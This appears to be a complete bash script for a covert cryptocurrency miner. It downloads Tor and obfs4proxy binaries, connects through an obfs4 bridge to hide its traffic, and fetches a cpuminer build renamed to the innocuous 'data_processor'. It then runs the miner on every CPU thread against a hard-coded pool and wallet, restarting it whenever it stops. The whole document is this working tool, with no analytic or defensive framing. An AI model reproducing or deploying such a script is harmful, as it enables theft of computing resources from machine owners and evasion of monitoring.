#!/bin/bash
set -euo pipefail

LOGFILE="tor_fixed_miner.log"
trap 'echo "[!] Error on line $LINENO at $(date)" | tee -a "$LOGFILE"; exit 1' ERR

FAKE_NAME="data_processor"
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
POOL="stratum+tcps://104.248.150.108:9933"
ALGO="power2b"
THREADS=$(nproc)
TOR_DIR="./tor"
TOR_BIN="$TOR_DIR/tor"
OBFS4_BIN="$TOR_DIR/obfs4proxy"
TORRC="$TOR_DIR/torrc"

mkdir -p "$TOR_DIR"

# Download tor binary statis (CLI only)
if [ ! -f "$TOR_BIN" ]; then
    echo "[*] Downloading TOR binary..." | tee -a "$LOGFILE"
    wget -qO "$TOR_BIN" https://raw.githubusercontent.com/arkadiyt/binary-tor/main/tor-linux
    chmod +x "$TOR_BIN"
fi

# Download obfs4proxy binary
if [ ! -f "$OBFS4_BIN" ]; then
    echo "[*] Downloading obfs4proxy..." | tee -a "$LOGFILE"
    wget -qO "$OBFS4_BIN" https://github.com/OperatorFoundation/obfs4/releases/download/v0.0.14/obfs4proxy-linux-amd64
    chmod +x "$OBFS4_BIN"
fi

# TOR config with working obfs4 bridge
cat <<EOF > "$TORRC"
RunAsDaemon 1
SocksPort 127.0.0.1:9050
Log notice file $TOR_DIR/tor.log
UseBridges 1
ClientTransportPlugin obfs4 exec $OBFS4_BIN
Bridge obfs4 194.132.209.80:443 7E58B5FEC9331DB0B02D0E121FA8840BE6E28794 cert=0Y2hUYo7QOaO7SrbMvvo39xfUvpkxKczdlss5xeEnTCHVcIkwxkzxDnRSB97UFA4LkSAIw iat-mode=0
EOF

echo "[*] Starting TOR with obfs4..." | tee -a "$LOGFILE"
$TOR_BIN -f "$TORRC" || true &
sleep 10

# Check connection via tor
if curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip --max-time 10 | grep -q "IsTor.*true"; then
    echo "[+] TOR via obfs4 connected." | tee -a "$LOGFILE"
    export ALL_PROXY=socks5h://127.0.0.1:9050
    TOR_CMD="env ALL_PROXY=socks5h://127.0.0.1:9050"
else
    echo "[!] TOR obfs4 failed. Continuing without proxy." | tee -a "$LOGFILE"
    TOR_CMD=""
fi

# Download miner
if [ ! -f "$FAKE_NAME" ]; then
    echo "[*] Downloading miner..." | tee -a "$LOGFILE"
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

run_miner() {
    while true; do
        echo "[*] Running miner..." >> "$LOGFILE"
        $TOR_CMD ./"$FAKE_NAME" -a "$ALGO" -o "$POOL" -u "$WALLET" -p x -t "$THREADS" >> /dev/null 2>&1 &
        PID=$!
        while sleep 20; do
            if ! ps -p $PID > /dev/null; then
                echo "[!] Miner crashed. Restarting..." >> "$LOGFILE"
                break
            fi
        done
    done
}

run_miner
